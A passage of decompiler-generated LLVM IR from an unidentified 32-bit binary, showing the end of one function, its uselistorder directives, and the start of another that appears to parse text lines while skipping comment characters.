  %v2_8050beb = icmp eq i1 %v16_8050be7, %v14_8050be7
  br i1 %v2_8050beb, label %dec_label_pc_8050bf3, label %dec_label_pc_8050bed

dec_label_pc_8050bed:                             ; preds = %dec_label_pc_8050baf
  %v4_8050bed = add i32 %v3_8050be7, 1
  store i32 %v4_8050bed, i32* %v2_8050be7, align 4
  br label %dec_label_pc_8050c14.backedge

dec_label_pc_8050bf3:                             ; preds = %dec_label_pc_805087c, %dec_label_pc_8050893, %dec_label_pc_8050baf, %dec_label_pc_8050ba8
  %v1_8050c02 = phi i32 [ %v1_80508cf, %dec_label_pc_8050893 ], [ %v1_8050be4, %dec_label_pc_8050baf ], [ %v1_8050baf, %dec_label_pc_8050ba8 ], [ %v0_8050bf3.pre, %dec_label_pc_805087c ]
  %v1_8050bf3 = add i32 %v1_8050c02, 40
  %v2_8050bf3 = inttoptr i32 %v1_8050bf3 to i32*
  %v3_8050bf3 = load i32, i32* %v2_8050bf3, align 4
  %v1_8050bf7 = add i32 %v3_8050bf3, 1
  store i32 %v1_8050bf7, i32* %eax.global-to-local, align 4
  %v1_8050bf8 = ashr i32 %v1_8050bf7, 31
  store i32 %v1_8050bf8, i32* %edx.global-to-local, align 4
  %v1_8050bf9 = add i32 %v1_8050c02, 248
  %v2_8050bf9 = inttoptr i32 %v1_8050bf9 to i32*
  %v3_8050bf9 = load i32, i32* %v2_8050bf9, align 4
  %v5_8050bf9 = zext i32 %v1_8050bf7 to i64
  %v7_8050bf9 = zext i32 %v1_8050bf8 to i64
  %v8_8050bf9 = mul nuw i64 %v7_8050bf9, 4294967296
  %v9_8050bf9 = or i64 %v8_8050bf9, %v5_8050bf9
  %v10_8050bf9 = zext i32 %v3_8050bf9 to i64
  %v11_8050bf9 = sdiv i64 %v9_8050bf9, %v10_8050bf9
  %v12_8050bf9 = trunc i64 %v11_8050bf9 to i32
  store i32 %v12_8050bf9, i32* %eax.global-to-local, align 4
  %v13_8050bf9 = srem i64 %v9_8050bf9, %v10_8050bf9
  %v14_8050bf9 = trunc i64 %v13_8050bf9 to i32
  store i32 %v14_8050bf9, i32* %edx.global-to-local, align 4
  %v1_8050c00 = icmp eq i32 %v14_8050bf9, 0
  store i32 %v14_8050bf9, i32* %v2_8050bf3, align 4
  %v1_8050c06 = icmp eq i1 %v1_8050c00, false
  br i1 %v1_8050c06, label %dec_label_pc_8050c0c, label %dec_label_pc_8050c08

dec_label_pc_8050c08:                             ; preds = %dec_label_pc_8050bf3
  %v0_8050c08 = load i32, i32* @esp, align 4
  %v1_8050c08 = add i32 %v0_8050c08, 28
  %v2_8050c08 = inttoptr i32 %v1_8050c08 to i32*
  %v3_8050c08 = load i32, i32* %v2_8050c08, align 4
  %v4_8050c08 = add i32 %v3_8050c08, 1
  store i32 %v4_8050c08, i32* %v2_8050c08, align 4
  br label %dec_label_pc_8050c0c

dec_label_pc_8050c0c:                             ; preds = %dec_label_pc_8050bf3, %dec_label_pc_8050c08
  %v0_8050c0c = load i32, i32* @esp, align 4
  %v1_8050c0c = add i32 %v0_8050c0c, 36
  %v2_8050c0c = inttoptr i32 %v1_8050c0c to i32*
  store i32 -1, i32* %v2_8050c0c, align 4
  br label %dec_label_pc_8050c14.backedge

dec_label_pc_8050c14.backedge:                    ; preds = %dec_label_pc_8050c0c, %dec_label_pc_8050978, %dec_label_pc_8050bed, %dec_label_pc_805088a
  %v0_8050c14.pre = load i32, i32* @esp, align 4
  %v1_8050c14 = add i32 %v0_8050c14.pre, 28
  %v2_8050c14 = inttoptr i32 %v1_8050c14 to i32*
  %v3_8050c14 = load i32, i32* %v2_8050c14, align 4
  %tmp121 = icmp ult i32 %v3_8050c14, 3
  br i1 %tmp121, label %dec_label_pc_8050674, label %dec_label_pc_8050c39

dec_label_pc_8050c39:                             ; preds = %dec_label_pc_80505ee, %dec_label_pc_805068a, %dec_label_pc_805077e, %dec_label_pc_8050c14.backedge, %dec_label_pc_8050590, %dec_label_pc_80505c8, %dec_label_pc_80505d0, %dec_label_pc_80505de
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_80505de ], [ -1, %dec_label_pc_80505d0 ], [ -1, %dec_label_pc_80505c8 ], [ -1, %dec_label_pc_8050590 ], [ %v0_805063b, %dec_label_pc_8050c14.backedge ], [ %v0_805063b, %dec_label_pc_805077e ], [ %v0_805063b, %dec_label_pc_805068a ], [ %v0_805063b, %dec_label_pc_80505ee ]
  %v0_8050c39 = call i32 @function_804f828()
  store i32 %v0_8050c39, i32* %eax.global-to-local, align 4
  %v1_8050c3e = inttoptr i32 %v0_8050c39 to i32*
  store i32 -1, i32* %v1_8050c3e, align 4
  %v0_8050c44 = load i32, i32* @esp, align 4
  %v1_8050c44 = add i32 %v0_8050c44, 56
  %v2_8050c44 = inttoptr i32 %v1_8050c44 to i32*
  %v3_8050c44 = load i32, i32* %v2_8050c44, align 4
  store i32 %v3_8050c44, i32* %eax.global-to-local, align 4
  %v2_8050c48 = add i32 %v0_8050c44, 44
  %v3_8050c48 = inttoptr i32 %v2_8050c48 to i32*
  store i32 %v3_8050c44, i32* %v3_8050c48, align 4
  br label %dec_label_pc_8050c4c

dec_label_pc_8050c4c:                             ; preds = %dec_label_pc_80509b1, %dec_label_pc_8050989, %dec_label_pc_8050c39
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8050c39 ], [ %v0_805063b, %dec_label_pc_80509b1 ], [ %v0_805063b, %dec_label_pc_8050989 ]
  %v0_8050c4c = load i32, i32* @esp, align 4
  %v1_8050c4c = add i32 %v0_8050c4c, 20
  %v2_8050c4c = inttoptr i32 %v1_8050c4c to i32*
  %v3_8050c4c = load i32, i32* %v2_8050c4c, align 4
  %v13_8050c4c = icmp eq i32 %v3_8050c4c, -1
  br i1 %v13_8050c4c, label %dec_label_pc_8050c4c.dec_label_pc_8050c62_crit_edge, label %dec_label_pc_8050c53

dec_label_pc_8050c4c.dec_label_pc_8050c62_crit_edge: ; preds = %dec_label_pc_8050c4c
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8050c62

dec_label_pc_8050c53:                             ; preds = %dec_label_pc_8050c4c
  %v3_8050c56 = load i32, i32* %v2_8050c4c, align 4
  %v5_8050c56 = add i32 %v0_8050c4c, -16
  %v6_8050c56 = inttoptr i32 %v5_8050c56 to i32*
  store i32 %v3_8050c56, i32* %v6_8050c56, align 4
  %v1_8050c5a = sext i16 %stack_var_-180.1 to i32
  %v2_8050c5a = call i32 @function_804b5f4(i32 %v1_8050c5a)
  store i32 %v2_8050c5a, i32* %eax.global-to-local, align 4
  %v0_8050c5f = load i32, i32* @esp, align 4
  %v1_8050c5f = add i32 %v0_8050c5f, 16
  br label %dec_label_pc_8050c62

dec_label_pc_8050c62:                             ; preds = %dec_label_pc_8050c4c.dec_label_pc_8050c62_crit_edge, %dec_label_pc_8050c53
  %v1_8050c69.pre-phi = phi i32 [ %.pre, %dec_label_pc_8050c4c.dec_label_pc_8050c62_crit_edge ], [ %v1_8050c5a, %dec_label_pc_8050c53 ]
  %v0_8050c62 = phi i32 [ %v0_8050c4c, %dec_label_pc_8050c4c.dec_label_pc_8050c62_crit_edge ], [ %v1_8050c5f, %dec_label_pc_8050c53 ]
  %v1_8050c65 = add i32 %v0_8050c62, 12
  %v2_8050c65 = inttoptr i32 %v1_8050c65 to i32*
  %v3_8050c65 = load i32, i32* %v2_8050c65, align 4
  %v5_8050c65 = add i32 %v0_8050c62, -16
  %v6_8050c65 = inttoptr i32 %v5_8050c65 to i32*
  store i32 %v3_8050c65, i32* %v6_8050c65, align 4
  %v2_8050c69 = call i32 @function_804e481(i32 %v1_8050c69.pre-phi)
  store i32 %v2_8050c69, i32* %eax.global-to-local, align 4
  %v1_8050c6e = load i32, i32* @esp, align 4
  %v2_8050c6e = inttoptr i32 %v1_8050c6e to i32*
  store i32 %v1_80505a6, i32* %v2_8050c6e, align 4
  %v2_8050c71 = call i32 @function_804e481(i32 %v1_8050c69.pre-phi)
  store i32 %v2_8050c71, i32* @eax, align 4
  %v0_8050c76 = load i32, i32* @esp, align 4
  %v1_8050c79 = add i32 %v0_8050c76, 56
  %v2_8050c79 = inttoptr i32 %v1_8050c79 to i32*
  %v3_8050c79 = load i32, i32* %v2_8050c79, align 4
  %v13_8050c79 = icmp eq i32 %v3_8050c79, -1
  %v1_8050c7e = add i32 %v0_8050c76, 32
  %v2_8050c7e = inttoptr i32 %v1_8050c7e to i32*
  store i32 -1, i32* %v2_8050c7e, align 4
  br i1 %v13_8050c79, label %dec_label_pc_8050c62.dec_label_pc_8050cd5_crit_edge, label %dec_label_pc_8050c88

dec_label_pc_8050c62.dec_label_pc_8050cd5_crit_edge: ; preds = %dec_label_pc_8050c62
  %v0_8050cd5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050cd5

dec_label_pc_8050c88:                             ; preds = %dec_label_pc_8050c62
  %v0_8050c88 = load i32, i32* @ecx, align 4
  %v1_8050c88 = load i32, i32* @esp, align 4
  %v2_8050c88 = add i32 %v1_8050c88, -4
  %v3_8050c88 = inttoptr i32 %v2_8050c88 to i32*
  store i32 %v0_8050c88, i32* %v3_8050c88, align 4
  %v1_8050c89 = add i32 %v1_8050c88, -8
  %v2_8050c89 = inttoptr i32 %v1_8050c89 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.194 to i32), i32* %v2_8050c89, align 4
  %v1_8050c8e = add i32 %v1_8050c88, -12
  %v2_8050c8e = inttoptr i32 %v1_8050c8e to i32*
  store i32 134541331, i32* %v2_8050c8e, align 4
  %v1_8050c93 = add i32 %v1_8050c88, 184
  store i32 %v1_8050c93, i32* %ebx.global-to-local, align 4
  %v2_8050c9a = add i32 %v1_8050c88, -16
  %v3_8050c9a = inttoptr i32 %v2_8050c9a to i32*
  store i32 %v1_8050c93, i32* %v3_8050c9a, align 4
  %v3_8050c9b = call i32 @function_804f016(i32 %v1_8050c69.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050c9b, i32* %eax.global-to-local, align 4
  %v0_8050ca0 = load i32, i32* @esp, align 4
  %v1_8050ca0 = inttoptr i32 %v0_8050ca0 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.194 to i32), i32* %v1_8050ca0, align 4
  %v2_8050ca7 = call i32 @function_804f013(i32 %v1_8050c69.pre-phi)
  store i32 %v2_8050ca7, i32* %eax.global-to-local, align 4
  %v0_8050cac = load i32, i32* @esp, align 4
  %v1_8050cac = add i32 %v0_8050cac, 60
  %v2_8050cac = inttoptr i32 %v1_8050cac to i32*
  %v3_8050cac = load i32, i32* %v2_8050cac, align 4
  store i32 %v3_8050cac, i32* %eax.global-to-local, align 4
  %v1_8050cb0 = add i32 %v0_8050cac, 56
  %v2_8050cb0 = inttoptr i32 %v1_8050cb0 to i32*
  %v3_8050cb0 = load i32, i32* %v2_8050cb0, align 4
  store i32 %v3_8050cb0, i32* %edx.global-to-local, align 4
  %v1_8050cb4 = trunc i32 %v3_8050cac to i16
  store i16 %v1_8050cb4, i16* @global_var_8055dac.196, align 4
  %v1_8050cba = inttoptr i32 %v0_8050cac to i32*
  %v2_8050cba = load i32, i32* %v1_8050cba, align 4
  store i32 %v2_8050cba, i32* @eax, align 4
  %v3_8050cba = add i32 %v0_8050cac, 4
  %v1_8050cbb = sext i32 %v3_8050cb0 to i64
  store i64 %v1_8050cbb, i64* @global_var_80584a0.195, align 32
  %v1_8050cc1 = inttoptr i32 %v3_8050cba to i32*
  %v2_8050cc1 = load i32, i32* %v1_8050cc1, align 4
  store i32 %v2_8050cc1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8050cc1, align 4
  %v0_8050cc4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050cc4, i32* %v1_8050cba, align 4
  %v3_8050cc5 = call i32 @function_804f016(i32 %v1_8050c69.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050cc5, i32* %eax.global-to-local, align 4
  %v0_8050cca = load i32, i32* @esp, align 4
  %v1_8050cca = add i32 %v0_8050cca, 32
  %v2_8050cca = inttoptr i32 %v1_8050cca to i32*
  store i32 -1, i32* %v2_8050cca, align 4
  br label %dec_label_pc_8050cd2

dec_label_pc_8050cd2:                             ; preds = %dec_label_pc_8050b46, %dec_label_pc_8050c88
  %v0_8050cd2 = load i32, i32* @esp, align 4
  %v1_8050cd2 = add i32 %v0_8050cd2, 16
  br label %dec_label_pc_8050cd5

dec_label_pc_8050cd5:                             ; preds = %dec_label_pc_8050c62.dec_label_pc_8050cd5_crit_edge, %dec_label_pc_8050cd2
  %v0_8050cd5 = phi i32 [ %v0_8050cd5.pre, %dec_label_pc_8050c62.dec_label_pc_8050cd5_crit_edge ], [ %v1_8050cd2, %dec_label_pc_8050cd2 ]
  %v1_8050cd5 = add i32 %v0_8050cd5, 16
  %v2_8050cd5 = inttoptr i32 %v1_8050cd5 to i32*
  %v3_8050cd5 = load i32, i32* %v2_8050cd5, align 4
  store i32 %v3_8050cd5, i32* %eax.global-to-local, align 4
  %v1_8050cd9 = add i32 %v0_8050cd5, 220
  %v1_8050cdf = inttoptr i32 %v1_8050cd9 to i32*
  %v2_8050cdf = load i32, i32* %v1_8050cdf, align 4
  store i32 %v2_8050cdf, i32* @ebx, align 4
  %v3_8050cdf = add i32 %v0_8050cd5, 224
  %v1_8050ce0 = inttoptr i32 %v3_8050cdf to i32*
  %v2_8050ce0 = load i32, i32* %v1_8050ce0, align 4
  store i32 %v2_8050ce0, i32* @esi, align 4
  %v3_8050ce0 = add i32 %v0_8050cd5, 228
  %v1_8050ce1 = inttoptr i32 %v3_8050ce0 to i32*
  %v2_8050ce1 = load i32, i32* %v1_8050ce1, align 4
  store i32 %v2_8050ce1, i32* @edi, align 4
  %v3_8050ce1 = add i32 %v0_8050cd5, 232
  %v1_8050ce2 = inttoptr i32 %v3_8050ce1 to i32*
  %v2_8050ce2 = load i32, i32* %v1_8050ce2, align 4
  store i32 %v2_8050ce2, i32* @ebp, align 4
  ret i32 %v3_8050cd5

; uselistorder directives
  uselistorder i32 %v0_8050cd5, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050cac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050c62, { 1, 0 }
  uselistorder i32 %v1_8050c69.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8050c14.pre, { 1, 0 }
  uselistorder i32 %v5_8050be7, { 1, 0 }
  uselistorder i32 %v3_8050be7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050baf, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8050b78, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050b46, { 1, 0 }
  uselistorder i32 %v3_8050b25, { 1, 0, 2 }
  uselistorder i32 %v0_8050b16, { 1, 0 }
  uselistorder i32 %v5_8050b0c, { 1, 0 }
  uselistorder i32* %v3_8050b0c, { 1, 0 }
  uselistorder i32 %v0_80509e280, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8050b0c, { 2, 1, 0 }
  uselistorder i32 %v5_8050b06, { 1, 0 }
  uselistorder i32 %v1_8050b05, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050b01, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050ac5, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8050a9f, { 1, 0 }
  uselistorder i32 %v1_8050a90, { 1, 0 }
  uselistorder i32 %v3_8050a61, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8050a4f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80509f6, { 1, 2, 0 }
  uselistorder i32 %v0_80509f6, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_80509d0, { 1, 0 }
  uselistorder i32 %v0_80509d0.pre, { 2, 1, 0 }
  uselistorder i32 %v0_80509c6, { 1, 2, 0 }
  uselistorder i32 %v0_80509d867, { 3, 2, 1, 0 }
  uselistorder i32 %v5_80509d057, { 1, 0 }
  uselistorder i32 %v5_8050972, { 1, 0 }
  uselistorder i32* %v2_8050972, { 1, 0, 2 }
  uselistorder i32 %v3_805092a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050910, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8050910, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_80508ef, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80508cf, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8050875, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_805085a, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8050843, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80507cb, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805077e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805075f, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8050743, { 1, 0 }
  uselistorder i32 %v3_8050738, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8050735, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_80506da, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_80506d5, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80506be, { 1, 0 }
  uselistorder i32 %v1_805068a, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805067b94, { 2, 1, 0 }
  uselistorder i16 %v0_805063b, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8050634, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 12, 13, 14, 15, 16, 11 }
  uselistorder i32 %v2_8050615, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_80505de, { 1, 0, 2 }
  uselistorder i32 %v1_80505a6, { 2, 3, 5, 10, 7, 11, 8, 1, 0, 9, 4, 6, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 4, 5, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 49, 8, 9, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 86, 87, 88, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 84, 50, 51, 52, 53, 54 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 2, 1 }
  uselistorder i32 100, { 0, 2, 3, 1 }
  uselistorder i32 68, { 2, 1, 3, 4, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804d9a4, { 5, 3, 1, 2, 0, 4 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804d954, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804da58, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 7, 6, 4, 5, 1, 2, 0, 9, 3, 8 }
  uselistorder i32 176, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @function_804d570, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @function_8051384, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 27, 13, 25, 24, 26, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 23, 24, 25, 21, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20, 22 }
  uselistorder i32 (i32)* @function_804b5f4, { 6, 0, 5, 13, 12, 11, 10, 9, 8, 2, 15, 14, 7, 1, 4, 3 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_8055dac.196, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0 }
  uselistorder i64* @global_var_80584a0.195, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8058488.194 to i32), { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_804daaa, { 6, 5, 1, 7, 4, 3, 8, 2, 0 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050cd5, { 1, 0 }
  uselistorder label %dec_label_pc_8050cd2, { 1, 0 }
  uselistorder label %dec_label_pc_8050c62, { 1, 0 }
  uselistorder label %dec_label_pc_8050c4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050c39, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8050c14.backedge, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8050c0c, { 1, 0 }
  uselistorder label %dec_label_pc_8050bf3, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_8050ba8, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8050b46, { 1, 0 }
  uselistorder label %dec_label_pc_8050b16, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8050b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8050b01, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050afe, { 1, 0 }
  uselistorder label %dec_label_pc_8050a79, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80509c1, { 1, 0 }
  uselistorder label %dec_label_pc_8050843, { 1, 0 }
  uselistorder label %dec_label_pc_805080c, { 1, 0 }
  uselistorder label %dec_label_pc_805077e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805068a, { 1, 0 }
  uselistorder label %dec_label_pc_8050674, { 1, 0 }
}

define i32 @function_8050ce4() local_unnamed_addr {
dec_label_pc_8050ce4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8050ce4 = load i32, i32* @ebp, align 4
  store i32 134541331, i32* %stack_var_-216, align 4
  %v3_8050cf3 = ptrtoint i32* %stack_var_-216 to i32
  %v2_8050cf8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050cf8, i32* @eax, align 4
  %v2_8050d00 = call i32 @function_804f016(i32 %v2_8050cf8, i32 134541331)
  %v1_8050d0c = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055db0.136 to i32))
  store i32 %v1_8050d0c, i32* @eax, align 4
  %v0_8050d14 = load i32, i32* @global_var_8058a94.137, align 4
  %tmp39 = icmp slt i32 %v0_8050d14, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_8050f0b, label %dec_label_pc_8050d21

dec_label_pc_8050d21:                             ; preds = %dec_label_pc_8050ce4
  store i32 ptrtoint (i32* @global_var_80549b0.199 to i32), i32* %stack_var_-216, align 4
  %v2_8050d2d = call i32 @function_804b90c(i32 ptrtoint ([17 x i8]* @global_var_805497e.200 to i32), i32 ptrtoint (i32* @global_var_80549b0.199 to i32))
  store i32 %v2_8050d2d, i32* @eax, align 4
  %v1_8050d35 = icmp eq i32 %v2_8050d2d, 0
  store i32 %v2_8050d2d, i32* @ebp, align 4
  %v1_8050d39 = icmp eq i1 %v1_8050d35, false
  br i1 %v1_8050d39, label %dec_label_pc_8050ed6.preheader, label %dec_label_pc_8050d3f

dec_label_pc_8050d3f:                             ; preds = %dec_label_pc_8050d21
  store i32 ptrtoint (i32* @global_var_80549b0.199 to i32), i32* %stack_var_-216, align 4
  %v2_8050d4b = call i32 @function_804b90c(i32 ptrtoint ([24 x i8]* @global_var_805498f.201 to i32), i32 ptrtoint (i32* @global_var_80549b0.199 to i32))
  %v1_8050d53 = icmp eq i32 %v2_8050d4b, 0
  store i32 %v2_8050d4b, i32* @ebp, align 4
  %v1_8050d57 = icmp eq i1 %v1_8050d53, false
  br i1 %v1_8050d57, label %dec_label_pc_8050ed6.preheader, label %dec_label_pc_8050f00

dec_label_pc_8050ed6.preheader:                   ; preds = %dec_label_pc_8050d21, %dec_label_pc_8050d3f
  %v2_8050edd = ptrtoint i32* %stack_var_-180 to i32
  %v3_8050e11 = add i32 %v3_8050cf3, 164
  %v4_8050e00 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8050ed6

dec_label_pc_8050d62:                             ; preds = %dec_label_pc_8050d6d
  %v1_8050d62 = add i32 %v0_8050d6254, 1
  store i32 %v1_8050d62, i32* @ebx, align 4
  %v1_8050d63 = inttoptr i32 %v1_8050d62 to i8*
  %v2_8050d63 = load i8, i8* %v1_8050d63, align 1
  %v3_8050d63 = zext i8 %v2_8050d63 to i32
  %v5_8050d63 = and i32 %v6_8050d6357, -256
  %v6_8050d63 = or i32 %v3_8050d63, %v5_8050d63
  store i32 %v6_8050d63, i32* @ecx, align 4
  %v4_8050d65 = icmp eq i8 %v2_8050d63, 0
  br i1 %v4_8050d65, label %dec_label_pc_8050ed6, label %dec_label_pc_8050d6d

dec_label_pc_8050d6d:                             ; preds = %dec_label_pc_8050d6d.lr.ph, %dec_label_pc_8050d62
  %v6_8050d6357 = phi i32 [ %v6_8050d6351, %dec_label_pc_8050d6d.lr.ph ], [ %v6_8050d63, %dec_label_pc_8050d62 ]
  %v2_8050d6356 = phi i8 [ %v2_8050d6348, %dec_label_pc_8050d6d.lr.ph ], [ %v2_8050d63, %dec_label_pc_8050d62 ]
  %v1_8050d6355 = phi i8* [ %v1_8050d6347, %dec_label_pc_8050d6d.lr.ph ], [ %v1_8050d63, %dec_label_pc_8050d62 ]
  %v0_8050d6254 = phi i32 [ %v0_8050d63.pre, %dec_label_pc_8050d6d.lr.ph ], [ %v1_8050d62, %dec_label_pc_8050d62 ]
  store i32 %v0_8050d6d.pre, i32* @eax, align 4
  %v2_8050d72 = sext i8 %v2_8050d6356 to i32
  store i32 %v2_8050d72, i32* @edx, align 4
  %v2_8050d75 = mul nsw i32 %v2_8050d72, 2
  %v3_8050d75 = add i32 %v0_8050d6d.pre, %v2_8050d75
  %v4_8050d75 = inttoptr i32 %v3_8050d75 to i8*
  %v5_8050d75 = load i8, i8* %v4_8050d75, align 1
  %v6_8050d75 = and i8 %v5_8050d75, 32
  %v7_8050d75 = icmp eq i8 %v6_8050d75, 0
  %v1_8050d79 = icmp eq i1 %v7_8050d75, false
  br i1 %v1_8050d79, label %dec_label_pc_8050d62, label %dec_label_pc_8050d7b

dec_label_pc_8050d7b:                             ; preds = %dec_label_pc_8050d6d
  %v10_8050d7b = icmp eq i8 %v2_8050d6356, 10
  br i1 %v10_8050d7b, label %dec_label_pc_8050ed6, label %dec_label_pc_8050d84

dec_label_pc_8050d84:                             ; preds = %dec_label_pc_8050d7b
  %v10_8050d84 = icmp eq i8 %v2_8050d6356, 35
  %v1_8050d8f = icmp eq i1 %v10_8050d84, false
  br i1 %v1_8050d8f, label %dec_label_pc_8050de0.preheader, label %dec_label_pc_8050ed6

dec_label_pc_8050de0.preheader:                   ; preds = %dec_label_pc_8050d84
  %v2_8050de04 = load i8, i8* %v1_8050d6355, align 1
  %v3_8050de05 = icmp eq i8 %v2_8050de04, 0
  br i1 %v3_8050de05, label %dec_label_pc_8050dec, label %dec_label_pc_8050de5

dec_label_pc_8050d96:                             ; preds = %dec_label_pc_8050de5
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_8050d9a = load i32, i32* @esp, align 4
  %v3_8050d9a = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_8050d9a = add nuw nsw i32 %v3_8050d9a, 152
  %v5_8050d9a = add i32 %v4_8050d9a, %v1_8050d9a
  %v6_8050d9a = inttoptr i32 %v5_8050d9a to i32*
  store i32 %v0_8050d9a, i32* %v6_8050d9a, align 4
  %v0_8050da4.pre = load i32, i32* @ebx, align 4
  %v4_8050da4.pre = load i32, i32* @ecx, align 4
  %v1_8050da458 = inttoptr i32 %v0_8050da4.pre to i8*
  %v2_8050da459 = load i8, i8* %v1_8050da458, align 1
  %v3_8050da460 = zext i8 %v2_8050da459 to i32
  %v5_8050da461 = and i32 %v4_8050da4.pre, -256
  %v6_8050da462 = or i32 %v3_8050da460, %v5_8050da461
  %v4_8050da663 = icmp eq i8 %v2_8050da459, 0
  br i1 %v4_8050da663, label %dec_label_pc_8050dc3.preheader, label %dec_label_pc_8050daa.lr.ph

dec_label_pc_8050daa.lr.ph:                       ; preds = %dec_label_pc_8050d96
  %v0_8050daa.pre = load i32, i32* @global_var_8055da0, align 32
  br label %dec_label_pc_8050daa

dec_label_pc_8050da3:                             ; preds = %dec_label_pc_8050db8
